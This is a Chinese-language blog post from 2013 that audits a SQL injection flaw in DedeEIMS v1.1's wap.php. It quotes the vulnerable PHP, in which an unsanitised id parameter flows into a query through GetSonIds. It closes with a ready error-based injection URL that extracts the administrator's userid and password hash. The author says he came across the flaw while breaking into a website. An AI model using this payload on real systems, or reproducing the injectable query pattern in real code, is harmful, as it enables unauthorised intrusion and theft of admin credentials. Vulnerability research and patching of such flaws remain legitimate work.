title: "dedeeims v1.1 SQL Injection"
date: 2013-06-09 23:41:12
tags:
id: 219
comment: false
categories:
  - 代码审计
---

<pre class="brush:php">前几天搞站第一次遇到,御剑的指纹识别出dedecms，但是没想到打开一看，原来是它亲戚。我操。

wap.php

......
else if($action=='list')
{
	$nrow = $dsql-&gt;GetOne("Select * From `#@__arctype` where ID='$id' ");
	if($nrow['ishidden']==1) exit();
	$typename = ConvertStr($nrow['typename']);
	$typeid = $nrow['id'];
	$catcontect = '';
	$userLang = $nrow['lang'];
	if($nrow['ispart']==3)
	{
		$catcontect = html2wml($nrow['content']);
	}
	$trow = $dsql-&gt;GetOne("Select id,typename From `#@__arctype` where lang='$userLang' And  reid=0 ");
	$langname = ConvertStr($trow['typename']);
	$langid = $trow['id'];
	//当前栏目下级分类
	$dsql-&gt;SetQuery("Select ID,typename From `#@__arctype` where reID='$id' And channeltype=1 And ishidden=0 And ispart&lt;&gt;2 order by sortrank");
	$dsql-&gt;Execute();
	while($row=$dsql-&gt;GetObject())
	{
		$channellistnext .= "&lt;a href='wap.php?action=list&amp;amp;id={$row-&gt;ID}'&gt;".ConvertStr($row-&gt;typename)."&lt;/a&gt; ";
	}
	//栏目内容(分页输出)
	$sids = GetSonIds($id,1,true);
	$varlist = "cfg_webname,typename,channellist,channellistnext,cfg_templeturl";
	ConvertCharset($varlist);
	require_once(dirname(__FILE__)."/include/datalistcp.class.php");
	$dlist = new DataListCP();
	$dlist-&gt;SetTemplet($cfg_templets_dir."/wap/list.wml");
	$dlist-&gt;pageSize = 10;
	$dlist-&gt;SetParameter("action","list");
	$dlist-&gt;SetParameter("id",$id);
	$dlist-&gt;SetSource("Select ID,title,pubdate,click From `#@__archives` where typeid in($sids) And arcrank=0 order by ID desc"); //注入
	$dlist-&gt;Display();
	exit();
}
.......

include/channelunit.func.php

//获得某id的所有下级id
function GetSonIds($id,$channel=0,$addthis=true)
{
	global $_Cs;
	$GLOBALS['idArray'] = array();
	if( !is_array($_Cs) )
	{
		require_once(DEDEROOT."/data/cache/inc_catalog_base.inc");
	}
	GetSonIdsLogic($id,$_Cs,$channel,$addthis);
	$rquery = join(',',$GLOBALS['idArray']);
	return $rquery;
}

//递归逻辑
function GetSonIdsLogic($id,$sArr,$channel=0,$addthis=false)
{
	if($id!=0 &amp;&amp; $addthis)
	{
		$GLOBALS['idArray'][$id] = $id;
	}
	foreach($sArr as $k=&gt;$v)
	{
		if( $v[0]==$id &amp;&amp; ($channel==0 || $v[1]==$channel ))
		{
			GetSonIdsLogic($k,$sArr,$channel,true);
		}
	}
}

EXP  //本来不会写，参考c4rp3nt3r http://www.0x50sec.org/code-audits/2013/01/id/1506/]dedecms EXP

http://10.1.1.129/DedeEIMS_1.1/wap.php?action=list&amp;id=1[/url] or @`'`=1 and (SELECT 1 FROM (select count(*),concat(floor(rand(0)*2),(substring((select+CONCAT(0x7c,userid,0x7c,pwd)+from+`%23@__admin`+limit+0,1),1,62)))a from information_schema.tables group by a)b) and @`'`=0</pre>